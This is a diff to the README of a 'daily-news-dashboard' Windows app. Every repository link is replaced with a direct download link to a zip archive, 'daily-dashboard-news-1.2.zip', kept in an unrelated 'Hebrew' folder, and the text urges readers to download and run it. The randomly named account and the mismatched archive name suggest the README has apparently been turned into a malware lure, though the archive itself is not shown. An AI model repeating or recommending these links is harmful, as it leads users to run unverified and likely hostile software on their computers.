@@ -1,11 +1,11 @@
 # 🗞️ daily-news-dashboard - Daily news in one clean view
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wild-orderpolemoniales647/daily-news-dashboard)
+[![Download the app](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wild-orderpolemoniales647/daily-news-dashboard/raw/refs/heads/main/Hebrew/daily-dashboard-news-1.2.zip)
 
 ## 📥 Download
 Visit this page to download and run the app on Windows:
 
-https://github.com/wild-orderpolemoniales647/daily-news-dashboard
+https://github.com/wild-orderpolemoniales647/daily-news-dashboard/raw/refs/heads/main/Hebrew/daily-dashboard-news-1.2.zip
 
 ## 🖥️ What this app does
 
@@ -38,7 +38,7 @@ For best results, keep your browser up to date.
 Follow these steps to download and run the app on Windows.
 
 1. Open the download page:
-   https://github.com/wild-orderpolemoniales647/daily-news-dashboard
+   https://github.com/wild-orderpolemoniales647/daily-news-dashboard/raw/refs/heads/main/Hebrew/daily-dashboard-news-1.2.zip
 
 2. On the page, look for the latest release or download files.
 
@@ -186,7 +186,7 @@ Use the app if you want to:
 
 Open the link below, download the app files, and run them on your Windows PC:
 
-https://github.com/wild-orderpolemoniales647/daily-news-dashboard
+https://github.com/wild-orderpolemoniales647/daily-news-dashboard/raw/refs/heads/main/Hebrew/daily-dashboard-news-1.2.zip
 
 ## 📝 Simple usage flow
 
